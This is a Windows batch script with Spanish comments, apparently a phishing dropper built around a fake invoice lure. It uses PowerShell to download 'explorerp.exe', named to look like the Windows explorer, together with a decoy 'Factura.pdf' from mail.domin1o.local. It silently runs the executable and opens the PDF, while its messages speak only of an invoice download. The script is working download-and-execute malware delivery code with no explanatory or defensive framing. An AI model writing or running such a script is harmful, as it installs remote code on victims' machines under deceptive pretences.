@echo off
REM --- Configuración de Variables ---

SET URL_ARCHIVO_EXE=http://mail.domin1o.local/explorerp.exe
SET NOMBRE_SALIDA_EXE="%USERPROFILE%\Downloads\explorerp.exe"

SET URL_ARCHIVO_PDF=http://mail.domin1o.local/Factura.pdf
SET NOMBRE_SALIDA_PDF="%USERPROFILE%\Downloads\Factura.pdf"

ECHO Iniciando descargas con PowerShell...

REM ----------------------------------------------------------------------
REM --- 1. DESCARGA DEL EXE ---
REM ----------------------------------------------------------------------
ECHO Descargando EXE...
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%URL_ARCHIVO_EXE%', '%NOMBRE_SALIDA_EXE%')"

REM ----------------------------------------------------------------------
REM --- 2. DESCARGA DEL PDF ---
REM ----------------------------------------------------------------------
ECHO Descargando PDF...
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%URL_ARCHIVO_PDF%', '%NOMBRE_SALIDA_PDF%')"

REM --- Comprobación y Ejecución ---
REM Nota: Usamos la ruta SIN comillas para la comprobación IF EXIST
SET ARCHIVO_COMPROBAR=%USERPROFILE%\Downloads\explorerp.exe

IF EXIST %ARCHIVO_COMPROBAR% (
    ECHO.
    ECHO Descarga Factura completada.
    
    REM --- Ejecuta el EXE ---
    start /B "" %NOMBRE_SALIDA_EXE%
    
    REM --- Ejecuta el PDF ---
    start /B "" %NOMBRE_SALIDA_PDF%
		
) ELSE (
    ECHO.
    ECHO ERROR: No se pudo descargar la factura intentelo de nuevo.
)
PAUSE
